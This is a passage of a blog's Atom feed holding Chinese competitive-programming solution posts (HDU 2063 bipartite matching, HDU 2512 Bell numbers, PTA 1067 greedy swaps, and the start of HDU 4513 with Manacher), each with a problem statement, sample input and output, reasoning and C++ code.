    <content type="html"><![CDATA[<h1 id="HDU-2063-过山车-匈牙利算法"><a href="#HDU-2063-过山车-匈牙利算法" class="headerlink" title="HDU 2063 过山车 (匈牙利算法)"></a>HDU 2063 过山车 (匈牙利算法)</h1><p>题目链接：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=2063" target="_blank" rel="noopener">HDU 2063</a></p><h2 id="Problem-Description"><a href="#Problem-Description" class="headerlink" title="Problem Description"></a>Problem Description</h2><blockquote><p>RPG girls今天和大家一起去游乐场玩，终于可以坐上梦寐以求的过山车了。可是，过山车的每一排只有两个座位，而且还有条不成文的规矩，就是每个女生必须找个个男生做partner和她同坐。但是，每个女孩都有各自的想法，举个例子把，Rabbit只愿意和XHD或PQK做partner，Grass只愿意和linle或LL做partner，PrincessSnow愿意和水域浪子或伪酷儿做partner。考虑到经费问题，boss刘决定只让找到partner的人去坐过山车，其他的人，嘿嘿，就站在下面看着吧。聪明的Acmer，你可以帮忙算算最多有多少对组合可以坐上过山车吗？</p></blockquote><a id="more"></a><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><blockquote><p>输入数据的第一行是三个整数K , M , N，分别表示可能的组合数目，女生的人数，男生的人数。0&lt;K&lt;=1000<br>1&lt;=N 和M&lt;=500.接下来的K行，每行有两个数，分别表示女生Ai愿意和男生Bj做partner。最后一个0结束输入。.</p></blockquote><h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><blockquote><p>对于每组数据，输出一个整数，表示可以坐上过山车的最多组合数。</p></blockquote><h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">6 3 3</span><br><span class="line">1 1</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">2 1</span><br><span class="line">2 3</span><br><span class="line">3 1</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure><h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><blockquote><p><a href="http://acm.hdu.edu.cn/search.php?field=problem&amp;key=RPG%D7%A8%B3%A1%C1%B7%CF%B0%C8%FC&amp;source=1&amp;searchmode=source" target="_blank" rel="noopener">RPG专场练习赛</a></p></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>如题。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>二分图最大匹配。</p><p>可以用最大流解决。也可以用匈牙利算法。匈牙利算法是最大流方法的一种优化。若采用邻接矩阵存图，时间复杂度 $O(V^2)$，空间复杂度 $O(V^2)$。若采用邻接表，时间复杂度 $O(VE)$，空间复杂度 $O(V+E)$。</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">510</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">int</span> g[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> vis[maxn], ok[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!vis[i] &amp;&amp; g[x][i]) &#123;</span><br><span class="line">            vis[i] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(!ok[i] || dfs(ok[i])) &#123;</span><br><span class="line">                ok[i] = x;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span> &gt;&gt; k &amp;&amp; k) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line">        <span class="built_in">memset</span>(g, <span class="number">0</span>, <span class="keyword">sizeof</span>(g));</span><br><span class="line">        <span class="built_in">memset</span>(ok, <span class="number">0</span>, <span class="keyword">sizeof</span>(ok));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> a, b;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b;</span><br><span class="line">            g[a][b] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">            <span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="keyword">sizeof</span>(vis));</span><br><span class="line">            <span class="keyword">if</span>(dfs(i)) ++sum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;HDU-2063-过山车-匈牙利算法&quot;&gt;&lt;a href=&quot;#HDU-2063-过山车-匈牙利算法&quot; class=&quot;headerlink&quot; title=&quot;HDU 2063 过山车 (匈牙利算法)&quot;&gt;&lt;/a&gt;HDU 2063 过山车 (匈牙利算法)&lt;/h1&gt;&lt;p&gt;题目链接：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=2063&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;HDU 2063&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Problem-Description&quot;&gt;&lt;a href=&quot;#Problem-Description&quot; class=&quot;headerlink&quot; title=&quot;Problem Description&quot;&gt;&lt;/a&gt;Problem Description&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;RPG girls今天和大家一起去游乐场玩，终于可以坐上梦寐以求的过山车了。可是，过山车的每一排只有两个座位，而且还有条不成文的规矩，就是每个女生必须找个个男生做partner和她同坐。但是，每个女孩都有各自的想法，举个例子把，Rabbit只愿意和XHD或PQK做partner，Grass只愿意和linle或LL做partner，PrincessSnow愿意和水域浪子或伪酷儿做partner。考虑到经费问题，boss刘决定只让找到partner的人去坐过山车，其他的人，嘿嘿，就站在下面看着吧。聪明的Acmer，你可以帮忙算算最多有多少对组合可以坐上过山车吗？&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="ACM刷题" scheme="http://wutao18.github.io/tags/ACM%E5%88%B7%E9%A2%98/"/>
    
      <category term="图论" scheme="http://wutao18.github.io/tags/%E5%9B%BE%E8%AE%BA/"/>
    
      <category term="匈牙利算法" scheme="http://wutao18.github.io/tags/%E5%8C%88%E7%89%99%E5%88%A9%E7%AE%97%E6%B3%95/"/>
    
      <category term="二分图" scheme="http://wutao18.github.io/tags/%E4%BA%8C%E5%88%86%E5%9B%BE/"/>
    
      <category term="网络流" scheme="http://wutao18.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B5%81/"/>
    
  </entry>
  
  <entry>
    <title>HDU 2512 一卡通大冒险 (第二类斯特林数)</title>
    <link href="http://wutao18.github.io/2019/11/17/HDU-2512-%E4%B8%80%E5%8D%A1%E9%80%9A%E5%A4%A7%E5%86%92%E9%99%A9-%E7%AC%AC%E4%BA%8C%E7%B1%BB%E6%96%AF%E7%89%B9%E6%9E%97%E6%95%B0/"/>
    <id>http://wutao18.github.io/2019/11/17/HDU-2512-%E4%B8%80%E5%8D%A1%E9%80%9A%E5%A4%A7%E5%86%92%E9%99%A9-%E7%AC%AC%E4%BA%8C%E7%B1%BB%E6%96%AF%E7%89%B9%E6%9E%97%E6%95%B0/</id>
    <published>2019-11-17T15:19:51.000Z</published>
    <updated>2020-10-27T03:31:00.881Z</updated>
    
    <content type="html"><![CDATA[<p>题目链接：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=2512" target="_blank" rel="noopener">HDU 2512</a></p><h2 id="Problem-Description"><a href="#Problem-Description" class="headerlink" title="Problem Description"></a>Problem Description</h2><blockquote><p>因为长期钻研算法， 无暇顾及个人问题，BUAA ACM/ICPC 训练小组的帅哥们大部分都是单身。某天，他们在机房商量一个绝妙的计划”一卡通大冒险”。这个计划是由wf最先提出来的，计划的内容是，把自己的联系方式写在校园一卡通的背面，然后故意将自己的卡”遗失”在某处（如水房，TD，食堂，主M。。。。）他们希望能有MM看到他们遗失卡，能主动跟他们联系，这样就有机会请MM吃饭了。他们决定将自己的一卡通夹在基本相同的书里，然后再将书遗失到校园的各个角落。正当大家为这个绝妙的计划叫好时，大家想到一个问题。很明显，如果只有一张一卡通，那么只有一种方法，即，将其夹入一本书中。当有两张一卡通时，就有了两种选择，即，将两张一卡通夹在一本书里，或者分开夹在不同的书里。当有三张一卡通时，他们就有了5种选择，即：</p><p>((A),(B),(C)) , ((A,B),(C)), ((B,C),(A)), ((A,C),(B)) ,((A,B,C)) 于是，</p><p>这个邪恶计划的组织者wf希望了解，如果ACM训练对里有n位帅哥（即有N张一卡通），那么要把这些一卡通夹到书里有多少种不同的方法。</p></blockquote><a id="more"></a><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><blockquote><p>包含多组数据，第一行为n，表示接下来有n组数据。以下每行一个数x，表示共有x张一卡通。(1≤x≤2000).</p></blockquote><h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><blockquote><p>对每组数据，输出一行：不同的方法数，因为这个数可能非常大，我们只需要它除以1000的余数。</p></blockquote><h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">100</span><br></pre></td></tr></table></figure><h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">5</span><br><span class="line">751</span><br></pre></td></tr></table></figure><h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><blockquote><p><a href="http://acm.hdu.edu.cn/search.php?field=problem&amp;key=ECJTU+2008+Autumn+Contest&amp;source=1&amp;searchmode=source" target="_blank" rel="noopener">ECJTU 2008 Autumn Contest</a></p></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>如题。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>将 $n$ 个各不相同的物品放到若干个相同的盒子，很明显就是第二类 Stirling 数。</p><p>题目中要把 $1$ 到 $n$ 个盒子的方案数加起来。该方案总数也称为贝尔 (Bell) 数。</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">2000</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> s[maxn][maxn], sum[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    s[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; maxn; ++i) &#123;</span><br><span class="line">        s[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        s[i][i] = <span class="number">1</span>;</span><br><span class="line">        sum[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; maxn; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; ++j) &#123;</span><br><span class="line">            s[i][j] = (s[i - <span class="number">1</span>][j - <span class="number">1</span>] + j * s[i - <span class="number">1</span>][j]) % mod;</span><br><span class="line">            sum[i] = (sum[i] + s[i][j]) % mod;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    init();</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">    <span class="keyword">while</span>(T--) &#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; sum[n] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目链接：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=2512&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;HDU 2512&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Problem-Description&quot;&gt;&lt;a href=&quot;#Problem-Description&quot; class=&quot;headerlink&quot; title=&quot;Problem Description&quot;&gt;&lt;/a&gt;Problem Description&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;因为长期钻研算法， 无暇顾及个人问题，BUAA ACM/ICPC 训练小组的帅哥们大部分都是单身。某天，他们在机房商量一个绝妙的计划”一卡通大冒险”。这个计划是由wf最先提出来的，计划的内容是，把自己的联系方式写在校园一卡通的背面，然后故意将自己的卡”遗失”在某处（如水房，TD，食堂，主M。。。。）他们希望能有MM看到他们遗失卡，能主动跟他们联系，这样就有机会请MM吃饭了。他们决定将自己的一卡通夹在基本相同的书里，然后再将书遗失到校园的各个角落。正当大家为这个绝妙的计划叫好时，大家想到一个问题。很明显，如果只有一张一卡通，那么只有一种方法，即，将其夹入一本书中。当有两张一卡通时，就有了两种选择，即，将两张一卡通夹在一本书里，或者分开夹在不同的书里。当有三张一卡通时，他们就有了5种选择，即：&lt;/p&gt;
&lt;p&gt;((A),(B),(C)) , ((A,B),(C)), ((B,C),(A)), ((A,C),(B)) ,((A,B,C)) 于是，&lt;/p&gt;
&lt;p&gt;这个邪恶计划的组织者wf希望了解，如果ACM训练对里有n位帅哥（即有N张一卡通），那么要把这些一卡通夹到书里有多少种不同的方法。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="ACM刷题" scheme="http://wutao18.github.io/tags/ACM%E5%88%B7%E9%A2%98/"/>
    
      <category term="数学" scheme="http://wutao18.github.io/tags/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="组合数学" scheme="http://wutao18.github.io/tags/%E7%BB%84%E5%90%88%E6%95%B0%E5%AD%A6/"/>
    
      <category term="斯特林数/Stirling number" scheme="http://wutao18.github.io/tags/%E6%96%AF%E7%89%B9%E6%9E%97%E6%95%B0-Stirling-number/"/>
    
  </entry>
  
  <entry>
    <title>PTA 1067 Sort with Swap(0, i) (贪心)</title>
    <link href="http://wutao18.github.io/2019/11/16/PTA-1067-Sort-with-Swap-0-i-%E8%B4%AA%E5%BF%83/"/>
    <id>http://wutao18.github.io/2019/11/16/PTA-1067-Sort-with-Swap-0-i-%E8%B4%AA%E5%BF%83/</id>
    <published>2019-11-16T15:40:53.000Z</published>
    <updated>2020-10-27T06:15:37.126Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PTA-1067-Sort-with-Swap-0-i-贪心"><a href="#PTA-1067-Sort-with-Swap-0-i-贪心" class="headerlink" title="PTA 1067 Sort with Swap(0, i) (贪心)"></a>PTA 1067 Sort with Swap(0, i) (贪心)</h1><p>题目链接：<a href="https://pintia.cn/problem-sets/994805342720868352/problems/994805403651522560" target="_blank" rel="noopener">1067 Sort with Swap(0, i) (25 分)</a></p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/gitnote/2019/11/16/1573916930346-1573916930573.png" alt=""></p><h2 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h2><p>给定长度为 $n$ 的排列，如果每次只能把某个数和第 $0$ 个数交换，那么要使排列是升序的最少需要交换几次。</p><a id="more"></a><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><strong>贪心</strong></p><p>由于是排列，所以排序后第 $i$ 个位置上的数就是 $i$。所以当 $a[0] \neq 0$ 时，把 $a[0]$ 位置上的元素交换到相应位置。如果 $a[0] = 0$，就找到第一个不在正确位置上的数，把它与第 $0$ 个数交换，那么下一次又是第一种情况了，也就是下一次交换可以换到正确的位置。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> arr[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; arr[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> c = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (c &lt; n) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[<span class="number">0</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">            swap(arr[<span class="number">0</span>], arr[arr[<span class="number">0</span>]]);</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (; c &lt; n &amp;&amp; arr[c] == c; ++c);</span><br><span class="line">            <span class="keyword">if</span> (c == n) <span class="keyword">break</span>;</span><br><span class="line">            swap(arr[<span class="number">0</span>], arr[c]);</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; cnt &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;PTA-1067-Sort-with-Swap-0-i-贪心&quot;&gt;&lt;a href=&quot;#PTA-1067-Sort-with-Swap-0-i-贪心&quot; class=&quot;headerlink&quot; title=&quot;PTA 1067 Sort with Swap(0, i) (贪心)&quot;&gt;&lt;/a&gt;PTA 1067 Sort with Swap(0, i) (贪心)&lt;/h1&gt;&lt;p&gt;题目链接：&lt;a href=&quot;https://pintia.cn/problem-sets/994805342720868352/problems/994805403651522560&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;1067 Sort with Swap(0, i) (25 分)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/WuTao18/images/master/gitnote/2019/11/16/1573916930346-1573916930573.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h2&gt;&lt;p&gt;给定长度为 $n$ 的排列，如果每次只能把某个数和第 $0$ 个数交换，那么要使排列是升序的最少需要交换几次。&lt;/p&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="ACM刷题" scheme="http://wutao18.github.io/tags/ACM%E5%88%B7%E9%A2%98/"/>
    
      <category term="贪心" scheme="http://wutao18.github.io/tags/%E8%B4%AA%E5%BF%83/"/>
    
      <category term="思维" scheme="http://wutao18.github.io/tags/%E6%80%9D%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>HDU 4513 吉哥系列故事——完美队形II (Manacher)</title>
    <link href="http://wutao18.github.io/2019/11/15/HDU-4513-%E5%90%89%E5%93%A5%E7%B3%BB%E5%88%97%E6%95%85%E4%BA%8B%E2%80%94%E2%80%94%E5%AE%8C%E7%BE%8E%E9%98%9F%E5%BD%A2II-Manacher/"/>
    <id>http://wutao18.github.io/2019/11/15/HDU-4513-%E5%90%89%E5%93%A5%E7%B3%BB%E5%88%97%E6%95%85%E4%BA%8B%E2%80%94%E2%80%94%E5%AE%8C%E7%BE%8E%E9%98%9F%E5%BD%A2II-Manacher/</id>
    <published>2019-11-15T15:05:08.000Z</published>
    <updated>2020-10-27T03:31:23.050Z</updated>
    
    <content type="html"><![CDATA[<p>题目链接：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=4513" target="_blank" rel="noopener">HDU 4513</a></p><h2 id="Problem-Description"><a href="#Problem-Description" class="headerlink" title="Problem Description"></a>Problem Description</h2><blockquote><p>吉哥又想出了一个新的完美队形游戏！</p><p>假设有n个人按顺序站在他的面前，他们的身高分别是h[1], h[2] … h[n]，吉哥希望从中挑出一些人，让这些人形成一个新的队形，新的队形若满足以下三点要求，则就是新的完美队形：</p><p>1、挑出的人保持原队形的相对顺序不变，且必须都是在原队形中连续的；</p><p>2、左右对称，假设有m个人形成新的队形，则第1个人和第m个人身高相同，第2个人和第m-1个人身高相同，依此类推，当然如果m是奇数，中间那个人可以任意；</p><p>3、从左到中间那个人，身高需保证不下降，如果用H表示新队形的高度，则H[1] &lt;= H[2] &lt;= H[3] …. &lt;= H[mid]。</p><p>现在吉哥想知道：最多能选出多少人组成新的完美队形呢？</p></blockquote><a id="more"></a><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><blockquote><p>输入数据第一行包含一个整数T，表示总共有T组测试数据(T &lt;= 20)；</p><p>每组数据首先是一个整数n(1 &lt;= n &lt;= 100000)，表示原先队形的人数，接下来一行输入n个整数，表示原队形从左到右站的人的身高（50 &lt;= h &lt;= 250，不排除特别矮小和高大的）。</p></blockquote><h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><blockquote><p>请输出能组成完美队形的最多人数，每组输出占一行。</p></blockquote><h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">3</span><br><span class="line">51 52 51</span><br><span class="line">4</span><br><span class="line">51 52 52 51</span><br></pre></td></tr></table></figure><h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><blockquote><p><a href="http://acm.hdu.edu.cn/search.php?field=problem&amp;key=2013%CC%DA%D1%B6%B1%E0%B3%CC%C2%ED%C0%AD%CB%C9%B3%F5%C8%FC%B5%DA%B6%FE%B3%A1%A3%A83%D4%C222%C8%D5%A3%A9&amp;source=1&amp;searchmode=source" target="_blank" rel="noopener">2013腾讯编程马拉松初赛第二场（3月22日）</a></p></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>如题。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>在 Manacher 求最长回文子串时增加一个判断条件: h[i - len[i]] &lt;= h[i - len[i] + 2]</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 